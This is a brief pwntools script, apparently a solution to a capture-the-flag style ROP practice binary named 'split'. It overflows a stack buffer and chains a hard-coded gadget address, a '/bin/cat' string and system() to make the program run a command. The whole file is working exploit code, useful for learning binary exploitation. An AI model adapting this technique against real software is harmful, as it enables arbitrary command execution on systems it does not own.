from pwn import *

sh = process('./split')
elf = ELF('./split')

system_addr = elf.symbols['system']
rop_addr = 0x0000000000400883
shell_addr = elf.search('/bin/cat').next()

payload = 'a' * (0x20 + 0x8) + p64(rop_addr) + p64(shell_addr) + p64(system_addr)

sh.recvuntil('>')
sh.send(payload)

sh.interactive()
sh.close()